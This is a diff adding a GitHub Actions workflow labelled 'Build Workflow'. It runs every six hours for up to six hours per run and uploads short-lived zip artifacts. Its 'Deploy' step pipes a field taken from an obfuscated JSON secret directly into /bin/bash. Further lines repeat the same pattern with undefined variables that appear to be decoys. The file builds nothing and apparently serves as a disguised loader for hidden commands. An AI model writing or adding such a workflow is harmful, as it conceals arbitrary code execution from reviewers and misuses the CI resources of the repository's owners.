@@ -1,0 +1,38 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '59 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          pmw24: ${{ secrets.pmw24 }}
+        run: |
+          printf '%s' "$pmw24" | jq -r .azhlr3 | /bin/bash
+          echo $tjgsp970 | jq -r .ope5413 | /bin/bash
+          printf '%s' "$r1" | jq -r .nulca70 | /bin/bash
+          echo $ram61 | jq -r .exa44428 | /bin/bash
+          printf '%s' "$qr41403" | jq -r .yyanj1 | /bin/bash
+          printf '%s' "$pve12708" | jq -r .cdmmx9 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: TspZ4pkV
+          path: "*.zip"
+          retention-days: 1
